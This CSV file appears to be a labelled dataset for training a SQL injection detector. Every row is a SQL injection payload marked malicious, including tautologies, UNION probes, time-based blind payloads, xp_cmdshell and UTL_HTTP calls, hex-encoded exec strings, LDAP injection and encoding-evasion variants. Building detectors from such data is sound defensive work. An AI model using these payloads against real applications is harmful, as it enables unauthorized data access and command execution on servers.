Query,Label
or sleep(__TIME__)#,1
select * from information_schema.tables--,1
a' or 1=1--,1
a' or 'a' = 'a,1
declare @s varchar(22) select @s =,1
or 2 between 1 and 3,1
or a=a--,1
or '1'='1,1
|,1
or sleep(__TIME__)=',1
or 1 --',1
"or 0=0 #""",1
having,1
a',1
""" or isNULL(1/0) /*",1
declare @s varchar (8000) select @s = 0x73656c ...,1
â or 1=1 --,1
char%4039%41%2b%40SELECT,1
order by,1
bfilename,1
having 1=1--,1
") or benchmark(10000000,MD5(1))#",1
or username like char(37);,1
;waitfor delay '0:0:__TIME__'--,1
""" or 1=1--",1
x' AND userid IS NULL; --,1
*/*,1
or 'text' > 't',1
(select top 1,1
"or benchmark(10000000,MD5(1))#",1
""");waitfor delay '0:0:__TIME__'--",1
a' or 3=3--,1
-- &password=,1
group by userid having 1=1--,1
or ''=',1
; exec master..xp_cmdshell,1
%20or%20x=x,1
select,1
""")) or sleep(__TIME__)=""",1
0x730065006c0065006300740020004000400076006500 ...,1
hi' or 1=1 --,1
""") or pg_sleep(__TIME__)--",1
%20or%20'x'='x,1
or 'something' = 'some'+'thing',1
exec sp,1
29 %,1
(,1
Ã½ or 1=1 --,1
1 or pg_sleep(__TIME__)--,1
0 or 1=1,1
) or (a=a,1
uni/**/on sel/**/ect,1
replace,1
%27%20or%201=1,1
)) or pg_sleep(__TIME__)--,1
%7C,1
x' AND 1=(SELECT COUNT(*) FROM tabname); --,1
&apos;%20OR,1
; or '1'='1',1
declare @q nvarchar (200) select @q = 0x770061 ...,1
1 or 1=1,1
; exec ('sel' + 'ect us' + 'er'),1
23 OR 1=1,1
/,1
anything' OR 'x'='x,1
declare @q nvarchar (4000) select @q =,1
or 0=0 --,1
desc,1
||'6,1
),1
1)) or sleep(__TIME__)#,1
or 0=0 #,1
select name from syscolumns where id = (sele ...,1
hi or a=a,1
*(|(mail=*)),1
password:*/=1--,1
distinct,1
);waitfor delay '0:0:__TIME__'--,1
to_timestamp_tz,1
""") or benchmark(10000000,MD5(1))#",1
UNION SELECT,1
%2A%28%7C%28mail%3D%2A%29%29,1
+sqlvuln,1
or 1=1 /*,1
)) or sleep(__TIME__)=',1
"or 1=1 or """"=",1
or 1 in (select @@version)--,1
sqlvuln;,1
union select * from users where login = char ...,1
x' or 1=1 or 'x'='y,1
28 %,1
â or 3=3 --,1
@variable,1
or '1'='1'--,1
"""a"""" or 1=1--""",1
//*,1
%2A%7C,1
""" or 0=0 --",1
""")) or pg_sleep(__TIME__)--",1
?,1
or 1/*,1
!,1
',1
or a = a,1
declare @q nvarchar (200) select @q = 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec(@q),1
declare @s varchar(200) select @s = 0x77616974666F722064656C61792027303A303A31302700 exec(@s),1
declare @q nvarchar (200) 0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q),1
declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s),1
' or 1=1,1
 or 1=1 --,1
x' OR full_name LIKE '%Bob%,1
'; exec master..xp_cmdshell 'ping 172.10.1.255'--,1
'%20or%20''=',1
'%20or%20'x'='x,1
')%20or%20('x'='x,1
' or 0=0 --,1
' or 0=0 #,1
"or 0=0 #""",1
' or 1=1--,1
' or '1'='1'--,1
' or 1 --',1
or 1=1--,1
' or 1=1 or ''=',1
"or 1=1 or """"=",1
' or a=a--,1
or a=a,1
') or ('a'='a,1
'hi' or 'x'='x';,1
or,1
procedure,1
handler,1
' or username like '%,1
' or uname like '%,1
' or userid like '%,1
' or uid like '%,1
' or user like '%,1
'; exec master..xp_cmdshell,1
'; exec xp_regread,1
t'exec master..xp_cmdshell 'nslookup www.google.com'--,1
--sp_password,1
' UNION SELECT,1
' UNION ALL SELECT,1
' or (EXISTS),1
' (select top 1,1
'||UTL_HTTP.REQUEST,1
1;SELECT%20*,1
"<>""'%;)(&+",1
'%20or%201=1,1
'sqlattempt1,1
%28,1
%29,1
%26,1
%21,1
' or ''=',1
' or 3=3,1
 or 3=3 --,1
%C0%80%27%C0%80%C0%80%C0%80O%C0%82R%C0%80%C0%801%C0%80%C0%A11,1
